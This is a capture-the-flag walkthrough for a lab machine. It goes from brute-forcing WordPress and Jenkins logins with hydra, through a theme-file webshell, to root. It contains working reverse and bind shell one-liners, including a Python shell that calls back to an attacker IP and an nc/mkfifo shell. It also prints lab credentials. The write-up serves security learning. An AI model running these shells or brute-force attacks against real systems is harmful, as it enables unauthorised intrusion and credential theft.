# NETWORK ENUMERATION

|                           PORT                          | STATE SERVICE REASON |                                VERSION                               |
|:-------------------------------------------------------:|:--------------------:|:--------------------------------------------------------------------:|
|                       22/tcp open                       |          ssh         | syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
|                       80/tcp open                       |         http         |                syn-ack Apache httpd 2.4.29 ((Ubuntu))                |
| Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel |                      |                                                                      |

# WEB ENUMERATION

On internal.thm, the home page is the default apache2 installation page.<br>
Using gobuster, we can find the following directories :<br>

| Path        | Info     |      |
|-------------|----------|------|
| /blog       | (Status: | 301) |
| /wordpress  | (Status: | 301) |
| /javascript | (Status: | 301) |
| /phpmyadmin | (Status: | 301) |


The /blog and the /wordpress path seems to redirect to the same wordpressblog.<br>
The /javascript seems to contain javascript code..<br>
The /phpmyadmin redirect to the phpmyadmin webapp but we don't have any credentials.<br>


The wordpress blog is mainly empty, but we can figure out one user when analysing the source code:<br>
"http://internal.thm/blog/index.php/author/admin/"<br>
the <strong>admin</strong> user<br>

## Brute force a wordpress login page

The login page can be found on the blog at : http://internal.thm/blog/wp-login.php<br>
We will use the hydra program to brute force the login form.<br>
First, we need to capture a login request.<br>
I will use burp suite but you can use whatever you want.<rb>

The post request made is :<br>
log=username&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1<br>
to the /blog/wp-login.php endpoint<br>

### HYDRA

> hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.2Fblog%thm%2Fwp-admin%2F&testcookie=1:Error"<br>

We have a match : [80][http-post-form] host: internal.thm   login: admin   password: [REDACTED]


### Exploiting a wordpress blog

We can access the admin panel of the wordpress blog.<br>
But now we need to find something to execute code and get access to the web server<br>
On Wordpress there are themes which can be modified and contain php pages<br>

We will modify the Twenty Seventeen theme.<br>

-> Apparance -> Theme editor -> 404.php

I will use a php webshell like the : https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985<br>

We need to access to the php file, which can be found on : 
> http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

Since we have a webshell, We can try to get a reverse shell on our computer.<br>
I didn't succeed to launch a reverse shell from the server, so I will use a bind shell<br>
I will use a php bind shell from the revshells.com site. :

php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4555);socket_listen($s,1);$cl=socket_accept($s);
while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd)
;socket_write($cl,$m,strlen($m));}}'


Then connect to the server using : <br>
nc internal.thm 4555

### Stabilize the shell

Since the connection is not very stable, I will throw a reverse shell from this connection to my computer.<br>
Throw a listener on your local machine : nc -lvp 4444<br>
On the remote machine : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc your_ip 4444 >/tmp/f

On the stabilization part, I will use python:
> python -c 'import pty;pty.spawn

> Ctrl + Z

> stty raw -echo

> fg

> export TERM=xTERM

# ENUMERATION OF THE SYSTEM

On the system, we can discover a user named : aubreanna<br>
But we don't have access to the home directory.<br>

We can try to find credentials for this user in the system.<br>
Let's try to search for files containing 'aubreanna'<br>
> grep -R aubreanna / 2>/dev/null

/opt/wp-save.txt:aubreanna:[REDACTED]

Since the user have an account, we can change the user to aubreanna<br>
> su aubreanna

We can also find wordpress mysql credentials in :<br>
/var/www/html/wordpress/wp-config.php<br>

wordpress:wordpress123<br>
<br>
We can also retrieve some phpmyadmin passwords :<br>
$dbpass=B2Ud4fEOZmVq';<br>
$dbuser='phpmyadmin';<br>

# Privilege escalation

In the home directory, we can find a "Jenkins.txt" saying :<br>
Internal Jenkins service is running on 172.17.0.2:8080

Using netstat, we can verify this information<br>
>netstat -ln 

| Active Internet connections (only servers) | Info            |                   |           |        |
|--------------------------------------------|-----------------|-------------------|-----------|--------|
| Proto Recv-Q Send-Q Local Address          | Foreign Address | State             |           |        |
| tcp                                        | 0               | 0 127.0.0.1:8080  | 0.0.0.0:* | LISTEN |
| tcp                                        | 0               | 0 127.0.0.53:53   | 0.0.0.0:* | LISTEN |
| tcp                                        | 0               | 0 0.0.0.0:22      | 0.0.0.0:* | LISTEN |
| tcp                                        | 0               | 0 0.0.0.0:4444    | 0.0.0.0:* | LISTEN |
| tcp                                        | 0               | 0 127.0.0.1:40003 | 0.0.0.0:* | LISTEN |
| tcp                                        | 0               | 0 127.0.0.1:3306  | 0.0.0.0:* | LISTEN |

A server is running on port 8080 but is not accessible from the outside.<br>
While exploring the system, we can find that docker is running, the webserver may be in this docker environment<br>

### REMOTE PORT FORWARDING

We will make this endpoint accessible to our attacker machine using SSH.<br>
The command is :<br>
> ssh -R ATTACKER_PORT:DESTINATION:DESTINATION_PORT USER@SSH_SERVER

We will execute this command on the server side<br>
> ssh -R 8080:127.0.0.1:8080 user@attacker_ip

Now, the endpoint is avaliable on our attacker machine when accessing localhost:8080 which redirect to 172.17.0.2:8080<br>

An other version, since we have the credentials of the aubreanna user, we can make a LOCAL PORT FORWARDING too.<br>
On our attacker machine, we can run :<br>
> SSH -L ATTACKER_PORT:DESTINATION:DESTINATION_PORT aubreanna@internal.thm

### HYDRA

The 8080 run a webserver running the Jenkins webapp.<br>
But we don't have any credentials, so we will try to brute force using hydra<br>
The most common user is <strong>admin</strong>
So let's capture a connexion using burp suite like for the wordpress blog<br>
j_username=username&j_password=password&from=%2F&Submit=Sign+in<br>
to : /j_acegi_security_check<br>

> hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://localhost:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"

And we got a match :<br>
| [80] | [http-post-form] | host: internal.thm login:admin | password: [REDACTED] |
  
## Jenkins to Reverse Shell

When creating a new Jenkins job, you can set a custom shell command to be run, and this command can be a reverse shell.<br>
First, create the job : New item -> Freestyle Style -> General -> Build -> add Build step -> Execute shell<br>

I will use a python reverse shell from the revshells.com<br>

> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
;s.connect(("10.8.9.166",4444));os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'


We spawn in a docker container without root privileges<br>
Let's try to find some credentials like aubreanna.<br>

> grep -R root / 2>/dev/null

/opt/note.txt:root:[REDACTED]<br>
Using it on the victim system, with aubreanna user, we can escalate to root and retrieve the flag.<br>


